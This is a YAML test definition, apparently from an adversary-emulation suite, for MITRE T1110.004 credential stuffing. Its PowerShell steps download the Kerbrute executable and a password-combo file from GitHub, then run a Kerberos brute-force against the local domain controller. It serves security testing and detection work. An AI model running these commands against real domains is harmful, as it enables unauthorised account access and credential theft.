api_version: "2.0"
name: Brute Force:Credential Stuffing using Kerbrute Tool
description: |
    Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack
args:
    - name: domaincontroller
      type: string
      default: $ENV:userdnsdomain
    - name: domain
      type: string
      default: $ENV:userdomain
uuid: 4852c630-87a9-409b-bb5e-5dc12c9ebcde
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.004: Credential Stuffing'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
        }}
      executor: powershell
    - name: |
        bruteforce.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteforce.txt"
        }}
      executor: powershell
    - name: brute-force:credential-stuffing-using-kerbrute-tool
      inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
